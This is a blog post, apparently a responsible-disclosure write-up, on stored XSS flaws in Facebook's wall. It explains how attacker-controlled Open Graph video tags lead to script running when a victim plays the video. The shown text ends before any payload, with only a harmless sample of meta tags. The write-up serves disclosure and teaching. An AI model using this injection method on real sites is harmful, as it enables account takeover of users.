<!DOCTYPE html>
<html lang="en-US" prefix="og: https://ogp.me/ns#">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="profile" href="http://gmpg.org/xfn/11">
<link rel="pingback" href="/xmlrpc.php">

<title>Stored XSS on Facebook | OpnSec</title>
<meta name='robots' content='max-image-preview:large'/>

<!-- All In One SEO Pack 3.6.2[280,324] -->
<script type="application/ld+json" class="aioseop-schema">{"@context":"https://schema.org","@graph":[{"@type":"Organization","@id":"/#organization","url":"/","name":"OpnSec","sameAs":[]},{"@type":"WebSite","@id":"/#website","url":"/","name":"OpnSec","publisher":{"@id":"/#organization"},"potentialAction":{"@type":"SearchAction","target":"/?s={search_term_string}","query-input":"required name=search_term_string"}},{"@type":"WebPage","@id":"/2018/03/stored-xss-on-facebook/#webpage","url":"/2018/03/stored-xss-on-facebook/","inLanguage":"en-US","name":"Stored XSS on Facebook","isPartOf":{"@id":"/#website"},"breadcrumb":{"@id":"/2018/03/stored-xss-on-facebook/#breadcrumblist"},"datePublished":"2018-03-18T15:41:18+00:00","dateModified":"2021-07-30T20:07:09+00:00"},{"@type":"Article","@id":"/2018/03/stored-xss-on-facebook/#article","isPartOf":{"@id":"/2018/03/stored-xss-on-facebook/#webpage"},"author":{"@id":"/author/opnsec/#author"},"headline":"Stored XSS on Facebook","datePublished":"2018-03-18T15:41:18+00:00","dateModified":"2021-07-30T20:07:09+00:00","commentCount":2,"mainEntityOfPage":{"@id":"/2018/03/stored-xss-on-facebook/#webpage"},"publisher":{"@id":"/#organization"},"articleSection":"Uncategorized, Facebook, XSS"},{"@type":"Person","@id":"/author/opnsec/#author","name":"Engue Gillier","sameAs":[],"image":{"@type":"ImageObject","@id":"/#personlogo","url":"https://secure.gravatar.com/avatar/ad925bdf7fba0f9608daa94bb809531a?s=96&d=mm&r=g","width":96,"height":96,"caption":"Engue Gillier"}},{"@type":"BreadcrumbList","@id":"/2018/03/stored-xss-on-facebook/#breadcrumblist","itemListElement":[{"@type":"ListItem","position":1,"item":{"@type":"WebPage","@id":"/","url":"/","name":"OpnSec"}},{"@type":"ListItem","position":2,"item":{"@type":"WebPage","@id":"/2018/03/stored-xss-on-facebook/","url":"/2018/03/stored-xss-on-facebook/","name":"Stored XSS on Facebook"}}]}]}</script>
<link rel="canonical" href="/2018/03/stored-xss-on-facebook/"/>
<meta property="og:type" content="article"/>
<meta property="og:title" content="Stored XSS on Facebook | OpnSec"/>
<meta property="og:description" content="tl;dr; Stored XSSes in Facebook wall by embedding an external video with Open Graph. When a user clicks to play the video, the XSS executes on facebook.com Introduction I reported multiple stored XSS"/>
<meta property="og:url" content="/2018/03/stored-xss-on-facebook/"/>
<meta property="og:site_name" content="OpnSec"/>
<meta property="og:image" content="/wp-content/uploads/2017/08/opnsec.png"/>
<meta property="article:published_time" content="2018-03-18T15:41:18Z"/>
<meta property="article:modified_time" content="2021-07-30T20:07:09Z"/>
<meta property="og:image:secure_url" content="/wp-content/uploads/2017/08/opnsec.png"/>
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:site" content="@opnsec.com"/>
<meta name="twitter:title" content="Stored XSS on Facebook | OpnSec"/>
<meta name="twitter:description" content="tl;dr; Stored XSSes in Facebook wall by embedding an external video with Open Graph. When a user clicks to play the video, the XSS executes on facebook.com Introduction I reported multiple stored XSS"/>
<meta name="twitter:image" content="/wp-content/uploads/2017/08/opnsec.png"/>
<!-- All In One SEO Pack -->
<link rel='dns-prefetch' href='//fonts.googleapis.com'/>
<link rel='dns-prefetch' href='//s.w.org'/>
<link rel="alternate" type="application/rss+xml" title="OpnSec &raquo; Feed" href="/feed/"/>
<link rel="alternate" type="application/rss+xml" title="OpnSec &raquo; Comments Feed" href="/comments/feed/"/>
<link rel="alternate" type="application/rss+xml" title="OpnSec &raquo; Stored XSS on Facebook Comments Feed" href="/2018/03/stored-xss-on-facebook/feed/"/>
<!-- This site uses the Google Analytics by ExactMetrics plugin v6.0.2 - Using Analytics tracking - https://www.exactmetrics.com/ -->
<script type="text/javascript" data-cfasync="false">var em_version='6.0.2';var em_track_user=true;var em_no_track_reason='';var disableStr='ga-disable-UA-108066765-1';function __gaTrackerIsOptedOut(){return document.cookie.indexOf(disableStr+'=true')>-1;}if(__gaTrackerIsOptedOut()){window[disableStr]=true;}function __gaTrackerOptout(){document.cookie=disableStr+'=true; expires=Thu, 31 Dec 2099 23:59:59 UTC; path=/';window[disableStr]=true;}if('undefined'===typeof gaOptout){function gaOptout(){__gaTrackerOptout();}}if(em_track_user){(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)})(window,document,'script','//www.google-analytics.com/analytics.js','__gaTracker');window.ga=__gaTracker;__gaTracker('create','UA-108066765-1','auto');__gaTracker('set','forceSSL',true);__gaTracker('send','pageview');__gaTracker(function(){window.ga=__gaTracker;});}else{console.log("");(function(){var noopfn=function(){return null;};var noopnullfn=function(){return null;};var Tracker=function(){return null;};var p=Tracker.prototype;p.get=noopfn;p.set=noopfn;p.send=noopfn;var __gaTracker=function(){var len=arguments.length;if(len===0){return;}var f=arguments[len-1];if(typeof f!=='object'||f===null||typeof f.hitCallback!=='function'){console.log('Not running function __gaTracker('+arguments[0]+" ....) because you are not being tracked. "+em_no_track_reason);return;}try{f.hitCallback();}catch(ex){}};__gaTracker.create=function(){return new Tracker();};__gaTracker.getByName=noopnullfn;__gaTracker.getAll=function(){return[];};__gaTracker.remove=noopfn;window['__gaTracker']=__gaTracker;window.ga=__gaTracker;})();}</script>
<!-- / Google Analytics by ExactMetrics -->
<script type="text/javascript">window._wpemojiSettings={"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/opnsec.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.0.11"}};!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode,e=(p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0),i.toDataURL());return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([129777,127995,8205,129778,127999],[129777,127995,8203,129778,127999])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(e=t.source||{}).concatemoji?c(e.concatemoji):e.wpemoji&&e.twemoji&&(c(e.twemoji),c(e.wpemoji)))}(window,document,window._wpemojiSettings);</script>
<style type="text/css">img.wp-smiley,img.emoji{display:inline!important;border:none!important;box-shadow:none!important;height:1em!important;width:1em!important;margin:0 .07em!important;vertical-align:-.1em!important;background:none!important;padding:0!important}</style>
	<link rel='stylesheet' id='wp-block-library-css' href='/wp-includes/css/dist/block-library/style.min.css?ver=6.0.11' type='text/css' media='all'/>
<style id='wp-block-library-inline-css' type='text/css'>.has-text-align-justify{text-align:justify}</style>
<style id='global-styles-inline-css' type='text/css'>body{--wp--preset--color--black:#000;--wp--preset--color--cyan-bluish-gray:#abb8c3;--wp--preset--color--white:#fff;--wp--preset--color--pale-pink:#f78da7;--wp--preset--color--vivid-red:#cf2e2e;--wp--preset--color--luminous-vivid-orange:#ff6900;--wp--preset--color--luminous-vivid-amber:#fcb900;--wp--preset--color--light-green-cyan:#7bdcb5;--wp--preset--color--vivid-green-cyan:#00d084;--wp--preset--color--pale-cyan-blue:#8ed1fc;--wp--preset--color--vivid-cyan-blue:#0693e3;--wp--preset--color--vivid-purple:#9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple:linear-gradient(135deg,rgba(6,147,227,1) 0%,#9b51e0 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan:linear-gradient(135deg,#7adcb4 0%,#00d082 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange:linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red:linear-gradient(135deg,rgba(255,105,0,1) 0%,#cf2e2e 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray:linear-gradient(135deg,#eee 0%,#a9b8c3 100%);--wp--preset--gradient--cool-to-warm-spectrum:linear-gradient(135deg,#4aeadc 0%,#9778d1 20%,#cf2aba 40%,#ee2c82 60%,#fb6962 80%,#fef84c 100%);--wp--preset--gradient--blush-light-purple:linear-gradient(135deg,#ffceec 0%,#9896f0 100%);--wp--preset--gradient--blush-bordeaux:linear-gradient(135deg,#fecda5 0%,#fe2d2d 50%,#6b003e 100%);--wp--preset--gradient--luminous-dusk:linear-gradient(135deg,#ffcb70 0%,#c751c0 50%,#4158d0 100%);--wp--preset--gradient--pale-ocean:linear-gradient(135deg,#fff5cb 0%,#b6e3d4 50%,#33a7b5 100%);--wp--preset--gradient--electric-grass:linear-gradient(135deg,#caf880 0%,#71ce7e 100%);--wp--preset--gradient--midnight:linear-gradient(135deg,#020381 0%,#2874fc 100%);--wp--preset--duotone--dark-grayscale:url(#wp-duotone-dark-grayscale);--wp--preset--duotone--grayscale:url(#wp-duotone-grayscale);--wp--preset--duotone--purple-yellow:url(#wp-duotone-purple-yellow);--wp--preset--duotone--blue-red:url(#wp-duotone-blue-red);--wp--preset--duotone--midnight:url(#wp-duotone-midnight);--wp--preset--duotone--magenta-yellow:url(#wp-duotone-magenta-yellow);--wp--preset--duotone--purple-green:url(#wp-duotone-purple-green);--wp--preset--duotone--blue-orange:url(#wp-duotone-blue-orange);--wp--preset--font-size--small:13px;--wp--preset--font-size--medium:20px;--wp--preset--font-size--large:36px;--wp--preset--font-size--x-large:42px}.has-black-color{color:var(--wp--preset--color--black)!important}.has-cyan-bluish-gray-color{color:var(--wp--preset--color--cyan-bluish-gray)!important}.has-white-color{color:var(--wp--preset--color--white)!important}.has-pale-pink-color{color:var(--wp--preset--color--pale-pink)!important}.has-vivid-red-color{color:var(--wp--preset--color--vivid-red)!important}.has-luminous-vivid-orange-color{color:var(--wp--preset--color--luminous-vivid-orange)!important}.has-luminous-vivid-amber-color{color:var(--wp--preset--color--luminous-vivid-amber)!important}.has-light-green-cyan-color{color:var(--wp--preset--color--light-green-cyan)!important}.has-vivid-green-cyan-color{color:var(--wp--preset--color--vivid-green-cyan)!important}.has-pale-cyan-blue-color{color:var(--wp--preset--color--pale-cyan-blue)!important}.has-vivid-cyan-blue-color{color:var(--wp--preset--color--vivid-cyan-blue)!important}.has-vivid-purple-color{color:var(--wp--preset--color--vivid-purple)!important}.has-black-background-color{background-color:var(--wp--preset--color--black)!important}.has-cyan-bluish-gray-background-color{background-color:var(--wp--preset--color--cyan-bluish-gray)!important}.has-white-background-color{background-color:var(--wp--preset--color--white)!important}.has-pale-pink-background-color{background-color:var(--wp--preset--color--pale-pink)!important}.has-vivid-red-background-color{background-color:var(--wp--preset--color--vivid-red)!important}.has-luminous-vivid-orange-background-color{background-color:var(--wp--preset--color--luminous-vivid-orange)!important}.has-luminous-vivid-amber-background-color{background-color:var(--wp--preset--color--luminous-vivid-amber)!important}.has-light-green-cyan-background-color{background-color:var(--wp--preset--color--light-green-cyan)!important}.has-vivid-green-cyan-background-color{background-color:var(--wp--preset--color--vivid-green-cyan)!important}.has-pale-cyan-blue-background-color{background-color:var(--wp--preset--color--pale-cyan-blue)!important}.has-vivid-cyan-blue-background-color{background-color:var(--wp--preset--color--vivid-cyan-blue)!important}.has-vivid-purple-background-color{background-color:var(--wp--preset--color--vivid-purple)!important}.has-black-border-color{border-color:var(--wp--preset--color--black)!important}.has-cyan-bluish-gray-border-color{border-color:var(--wp--preset--color--cyan-bluish-gray)!important}.has-white-border-color{border-color:var(--wp--preset--color--white)!important}.has-pale-pink-border-color{border-color:var(--wp--preset--color--pale-pink)!important}.has-vivid-red-border-color{border-color:var(--wp--preset--color--vivid-red)!important}.has-luminous-vivid-orange-border-color{border-color:var(--wp--preset--color--luminous-vivid-orange)!important}.has-luminous-vivid-amber-border-color{border-color:var(--wp--preset--color--luminous-vivid-amber)!important}.has-light-green-cyan-border-color{border-color:var(--wp--preset--color--light-green-cyan)!important}.has-vivid-green-cyan-border-color{border-color:var(--wp--preset--color--vivid-green-cyan)!important}.has-pale-cyan-blue-border-color{border-color:var(--wp--preset--color--pale-cyan-blue)!important}.has-vivid-cyan-blue-border-color{border-color:var(--wp--preset--color--vivid-cyan-blue)!important}.has-vivid-purple-border-color{border-color:var(--wp--preset--color--vivid-purple)!important}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background:var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple)!important}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background:var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan)!important}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background:var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange)!important}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background:var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red)!important}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background:var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray)!important}.has-cool-to-warm-spectrum-gradient-background{background:var(--wp--preset--gradient--cool-to-warm-spectrum)!important}.has-blush-light-purple-gradient-background{background:var(--wp--preset--gradient--blush-light-purple)!important}.has-blush-bordeaux-gradient-background{background:var(--wp--preset--gradient--blush-bordeaux)!important}.has-luminous-dusk-gradient-background{background:var(--wp--preset--gradient--luminous-dusk)!important}.has-pale-ocean-gradient-background{background:var(--wp--preset--gradient--pale-ocean)!important}.has-electric-grass-gradient-background{background:var(--wp--preset--gradient--electric-grass)!important}.has-midnight-gradient-background{background:var(--wp--preset--gradient--midnight)!important}.has-small-font-size{font-size:var(--wp--preset--font-size--small)!important}.has-medium-font-size{font-size:var(--wp--preset--font-size--medium)!important}.has-large-font-size{font-size:var(--wp--preset--font-size--large)!important}.has-x-large-font-size{font-size:var(--wp--preset--font-size--x-large)!important}</style>
<link rel='stylesheet' id='google_fonts-css' href='//fonts.googleapis.com/css?family=Lato:300,400,700|Raleway:400,300,700' type='text/css' media='all'/>
<link rel='stylesheet' id='font-awesome-css' href='/wp-content/themes/flat-bootstrap/font-awesome/css/font-awesome.min.css?ver=4.5.0' type='text/css' media='all'/>
<link rel='stylesheet' id='bootstrap-css' href='/wp-content/themes/flat-bootstrap/bootstrap/css/bootstrap.min.css?ver=3.3.6' type='text/css' media='all'/>
<link rel='stylesheet' id='theme-base-css' href='/wp-content/themes/flat-bootstrap/css/theme-base.css?ver=20160323' type='text/css' media='all'/>
<link rel='stylesheet' id='theme-flat-css' href='/wp-content/themes/flat-bootstrap/css/theme-flat.css?ver=20160323' type='text/css' media='all'/>
<link rel='stylesheet' id='flat-bootstrap-css' href='/wp-content/themes/flat-bootstrap/style.css?ver=6.0.11' type='text/css' media='all'/>
<link rel='stylesheet' id='jetpack_css-css' href='/wp-content/plugins/jetpack/css/jetpack.css?ver=8.5.3' type='text/css' media='all'/>
<script type='text/javascript' id='exactmetrics-frontend-script-js-extra'>//<![CDATA[
var exactmetrics_frontend={"js_events_tracking":"true","download_extensions":"zip,mp3,mpeg,pdf,docx,pptx,xlsx,rar","inbound_paths":"[{\"path\":\"\\\/go\\\/\",\"label\":\"affiliate\"},{\"path\":\"\\\/recommend\\\/\",\"label\":\"affiliate\"}]","home_url":"https:\/\/opnsec.com","hash_tracking":"false"};
//]]></script>
<script type='text/javascript' src='/wp-content/plugins/google-analytics-dashboard-for-wp/assets/js/frontend.min.js?ver=6.0.2' id='exactmetrics-frontend-script-js'></script>
<script type='text/javascript' src='/wp-includes/js/jquery/jquery.min.js?ver=3.6.0' id='jquery-core-js'></script>
<script type='text/javascript' src='/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2' id='jquery-migrate-js'></script>
<link rel="https://api.w.org/" href="/wp-json/"/><link rel="alternate" type="application/json" href="/wp-json/wp/v2/posts/242"/><link rel="EditURI" type="application/rsd+xml" title="RSD" href="/xmlrpc.php?rsd"/>
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="/wp-includes/wlwmanifest.xml"/> 
<meta name="generator" content="WordPress 6.0.11"/>
<link rel='shortlink' href='/?p=242'/>
<link rel="alternate" type="application/json+oembed" href="/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fopnsec.com%2F2018%2F03%2Fstored-xss-on-facebook%2F"/>
<link rel="alternate" type="text/xml+oembed" href="/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fopnsec.com%2F2018%2F03%2Fstored-xss-on-facebook%2F&#038;format=xml"/>
<style>.post-thumbnail img[src$=".svg"]{width:100%;height:auto}</style><style type='text/css'>img#wpstats{display:none}</style><style type="text/css">.recentcomments a{display:inline!important;padding:0!important;margin:0!important}</style>	<style type="text/css">.site-title a,.site-description{color:#16a085}.site-title a:hover,.site-title a:active,.site-title a:focus{opacity:.75}.navbar-brand{position:absolute;clip:rect(1px,1px,1px,1px)}</style>
	<meta name="twitter:widgets:link-color" content="#000000"><meta name="twitter:widgets:border-color" content="#000000"><meta name="twitter:partner" content="tfwp"><link rel="icon" href="/wp-content/uploads/2017/08/cropped-opnsec-32x32.png" sizes="32x32"/>
<link rel="icon" href="/wp-content/uploads/2017/08/cropped-opnsec-192x192.png" sizes="192x192"/>
<link rel="apple-touch-icon" href="/wp-content/uploads/2017/08/cropped-opnsec-180x180.png"/>
<meta name="msapplication-TileImage" content="/wp-content/uploads/2017/08/cropped-opnsec-270x270.png"/>


</head>

<body class="post-template-default single single-post postid-242 single-format-standard">
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-dark-grayscale"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "/><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0 0.49803921568627"/><feFuncG type="table" tableValues="0 0.49803921568627"/><feFuncB type="table" tableValues="0 0.49803921568627"/><feFuncA type="table" tableValues="1 1"/></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"/></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-grayscale"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "/><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0 1"/><feFuncG type="table" tableValues="0 1"/><feFuncB type="table" tableValues="0 1"/><feFuncA type="table" tableValues="1 1"/></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"/></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-purple-yellow"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "/><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0.54901960784314 0.98823529411765"/><feFuncG type="table" tableValues="0 1"/><feFuncB type="table" tableValues="0.71764705882353 0.25490196078431"/><feFuncA type="table" tableValues="1 1"/></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"/></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-blue-red"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "/><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0 1"/><feFuncG type="table" tableValues="0 0.27843137254902"/><feFuncB type="table" tableValues="0.5921568627451 0.27843137254902"/><feFuncA type="table" tableValues="1 1"/></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"/></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-midnight"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "/><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0 0"/><feFuncG type="table" tableValues="0 0.64705882352941"/><feFuncB type="table" tableValues="0 1"/><feFuncA type="table" tableValues="1 1"/></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"/></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-magenta-yellow"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "/><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0.78039215686275 1"/><feFuncG type="table" tableValues="0 0.94901960784314"/><feFuncB type="table" tableValues="0.35294117647059 0.47058823529412"/><feFuncA type="table" tableValues="1 1"/></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"/></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-purple-green"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "/><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0.65098039215686 0.40392156862745"/><feFuncG type="table" tableValues="0 1"/><feFuncB type="table" tableValues="0.44705882352941 0.4"/><feFuncA type="table" tableValues="1 1"/></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"/></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-blue-orange"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "/><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0.098039215686275 1"/><feFuncG type="table" tableValues="0 0.66274509803922"/><feFuncB type="table" tableValues="0.84705882352941 0.41960784313725"/><feFuncA type="table" tableValues="1 1"/></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"/></filter></defs></svg><div id="page" class="hfeed site">

		
	<header id="masthead" class="site-header" role="banner">

					<div id="site-branding" class="site-branding">
			
							<div class="container">
                                <div class="site-branding-text">
				<h1 class="site-title"><a href="/" rel="home">OpnSec</a></h1>
				<h2 class="site-description">Open mind Security and Crypto!</h2>
				</div>
				</div>
						</div><!-- .site-branding -->

					

			
		<nav id="site-navigation" class="main-navigation" role="navigation">

			<h2 class="menu-toggle screen-reader-text sr-only ">Primary Menu</h2>
			<div class="skip-link"><a class="screen-reader-text sr-only" href="#content">Skip to content</a></div>

		<div class="navbar navbar-default navbar-static-top"><div class="container"><div class="navbar-header"><button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse"><span class="icon-bar"></span><span class="icon-bar"></span><span class="icon-bar"></span></button><a class="navbar-brand" href="/" rel="home">OpnSec</a></div><!-- navbar-header --><div class="navbar-collapse collapse"><div class="menu-test-container"><ul id="menu-test" class="nav navbar-nav"><li id="menu-item-313" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-313"><a title="About Me" href="/about-me/">About Me</a></li>
</ul></div>
		</div><!-- .container -->
		</div><!-- .navbar -->
		</nav><!-- #site-navigation -->

	</header><!-- #masthead -->

		
	<div id="content" class="site-content">



			<header class="content-header">
		<div class="container">
		<h1 class="page-title">Stored XSS on Facebook</h1>
				</div>
		</header>

	

<a id="pagetop"></a>



<div class="container">
<div id="main-grid" class="row">

	<div id="primary" class="content-area col-md-8">
		<main id="main" class="site-main" role="main">

		
			
<article id="post-242" class="post-242 post type-post status-publish format-standard hentry category-uncategorized tag-facebook tag-xss">

	
<header class="entry-header">
	<div class="entry-meta">
	
		
		
						<p><span class="posted-on"><span class="glyphicon glyphicon-calendar"></span>&nbsp;
			March 18, 2018 
			</span>
	
			
		
					 &nbsp;|&nbsp;<span class="comments-link">
			 <span class="glyphicon glyphicon-comment"></span>&nbsp;
			 <a href="/2018/03/stored-xss-on-facebook/#comments" class="smoothscroll">2 Comments</a>			 </span>
		
				
	</div><!-- .entry-meta -->
</header><!-- .entry-header -->
	
	<div id="xsbf-entry-content" class="entry-content">
		<blockquote><p>tl;dr; Stored XSSes in Facebook wall by embedding an external video with Open Graph.</p>
<p>When a user clicks to play the video, the XSS executes on facebook.com</p></blockquote>
<h3>Introduction</h3>
<p>I reported multiple stored XSS on Facebook wall in April 2017.Â These stored XSS vulnerabilities were also present in WordPress soÂ I waited for WordPress to patch it before publishing this write-up. The vulnerabilities are now fixed on WordPress!</p>
<p>These XSS are a little bit complex because they require multiple steps, but each step by itself is pretty simple to understand.</p>
<p>&nbsp;</p>
<h3>The Open Graph protocol</h3>
<p>When you add a URL in a Facebook post, Facebook will use the <a href="http://ogp.me/">Open Graph protocol</a>Â (<a href="https://developers.facebook.com/docs/sharing/webmasters/" target="_blank" rel="noopener noreferrer">FB doc</a>) to display rich content. Â Here is a summary about how Facebook uses OG to embed external content in a FB post:</p>
<p>&nbsp;</p>
<ol>
<li>The attacker posts a URL on a FB post</li>
<li>FB server fetches the URL (server side) and reads the OG meta tags to extract info about the content of the URL (for example the content is a video with a title, a cover image, a video encoding type and a video file URL)</li>
<li>The victim views the FB post with the cover image and a play button</li>
<li>When the victim clicks on the play button, the video loads using the video info extracted from the OG meta tags. This is when the XSS will be executed</li>
</ol>
<p>&nbsp;</p>
<blockquote><p>This OG workflow is also used by many websites including Twitter and WordPress for example.<br/>
Step #2 is sensitive: server-side fetching of a user provided URL, which can often lead to SSRF.<br/>
Another potential vulnerability is Clickjacking if the hosting website uses X-Frame-Options: SAMEORIGIN on sensitive webpages and let the attacker inject arbitrary iframes on the same subdomain.</p>
<p>FB wasn&#8217;t vulnerable to either of these issues.</p></blockquote>
<p>The interesting part is #4 when FB loads the video after the victim clicks the play button. First, FB will send a XHR request to get the video type and the video file URL, which are both provided by the attacker in theÂ og:video:type (we&#8217;ll call it ogVideoType) and theÂ og:video:secure_url (ogVideoUrl) tags of the URL posted by the attacker. Here is a sample of OG meta tags:</p>
<pre><code></p>
<p>&lt;!DOCTYPE html&gt;</p>
<p>&lt;html&gt;</p>
<p>&lt;head&gt;</p>
<p>&lt;meta property="og:video:type" content="video/flv"&gt;</p>
<p>&lt;meta property="og:video:secure_url" content='https://example.com/video.flv'&gt;</p>
<p>&lt;meta property="og:video:width" content="718"&gt;</p>
<p>&lt;meta property="og:video:height" content="404"&gt;</p>
<p>&lt;meta property="og:image" content="https://example.com/cover.jpg"&gt;</p>
<p>(...)</p>
<p>&lt;/head&gt;</p>
<p>&lt;body&gt;</p>
<p>(...)<br/>
&lt;/body&gt;</p>
<p>&lt;/html&gt;</p>
<p></code></pre>
